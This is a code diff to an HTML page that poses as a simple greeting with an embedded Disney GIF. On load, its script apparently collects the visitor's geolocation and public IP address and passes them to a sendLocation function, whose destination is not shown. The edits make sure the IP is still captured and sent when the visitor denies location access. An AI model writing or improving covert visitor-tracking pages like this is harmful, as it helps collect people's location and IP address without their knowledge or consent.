@@ -1,7 +1,7 @@
 <!DOCTYPE html>
 <html>
 <body onload="getLocation()">
-  <h1> HI THERE </h1>
+  <h1>HI THERE</h1>
 <iframe src="https://giphy.com/embed/NWg7M1VlT101W" width="480" height="269" frameBorder="0" class="giphy-embed" allowFullScreen></iframe><p><a href="https://giphy.com/gifs/disney-bored-tired-NWg7M1VlT101W"></a></p>
 
 <script>
@@ -22,7 +22,8 @@ async function getIp(location) {
     }
     const data = await response.json();
     const ip = data.ip;
-    const ipLocation = "IP Address: " + ip + "<br>" + location;
+    const position=location || 'Coords unavailable'
+    const ipLocation = "IP Address: " + ip + "<br>" + position;
     console.log(ipLocation);
     sendLocation(ipLocation);
   }catch(error){
@@ -36,13 +37,13 @@ function handleSuccess(position) {
   const location = "Latitude: " + position.coords.latitude + 
     "<br>Longitude: " + position.coords.longitude;
     getIp(location)
-  sendLocation(location);
 }
 
 function handleError() {
   const errorMsg = "Sorry, no position available.";
   alert(errorMsg);
-  sendLocation(errorMsg);
+  getIp(errorMsg);
+  console.error(errorMsg);
 }
 
 function sendLocation(message) {
